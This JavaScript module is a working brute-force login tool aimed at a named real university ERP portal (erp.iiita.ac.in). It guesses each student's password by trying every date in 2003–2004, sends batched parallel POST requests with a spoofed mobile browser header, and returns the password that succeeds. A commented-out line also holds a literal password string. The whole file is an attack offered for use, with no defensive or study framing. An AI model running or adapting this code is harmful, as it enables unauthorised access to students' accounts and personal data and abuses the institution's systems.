const axios = require('axios');
const FormData = require('form-data');


async function main(app_no) {
    let found = false; let name = "N/A";
    let password="NOT A DATE";
    let yr = 2004;
    let month = 1;
    let date = 1;
    let pwd = "";
    for (yr = 2004; yr >= 2003; yr--) {
        for (month = 1; month <= 12; month++) {
            let arr=[];
            for (date = 1; date <= 31; date++) {
                
                let ystr = yr.toString();
                let mstr = month.toString();
                let dstr = date.toString();
                if (mstr.length == 1) mstr = "0" + mstr;
                if (dstr.length == 1) dstr = "0" + dstr;
                pwd = ystr + "-" + mstr + "-" + dstr;
                let outp = execute(app_no, pwd)
                arr.push(outp);
            }
            const narr=await Promise.all(arr);
            for(i=0;i<narr.length;i++){
                if(narr[i].data && narr[i].data.length!=0){
                        // console.log(narr[i].pwd)
                        return narr[i].pwd;
                 }
            }
            console.log("Sent requests for "+month+" month and year "+yr);
    }
}
return password
}
async function execute(app_no, pwd) {

    let data = new FormData();
    data.append('myBatch', 'Jan-2024');
    data.append('uid', app_no);
    data.append('pwd', pwd);
    data.append('norobo', '1');
    const { parse } = require("node-html-parser");

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'https://erp.iiita.ac.in/',
        headers: {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9,hi;q=0.8',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Origin': 'https://erp.iiita.ac.in',
            'Referer': 'https://erp.iiita.ac.in/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            ...data.getHeaders()
        },
        data: data
    };
    try {
        const res = await axios.request(config);
        const root = parse(res.data);
        return {data: root.getElementsByTagName("sup"),pwd}
        // if(pwd=="Om@iiita1") console.log(root.toString())
    }
    catch(e){
        console.log("FAILED FOR "+pwd+e);
    }
    return null;
}

module.exports={main};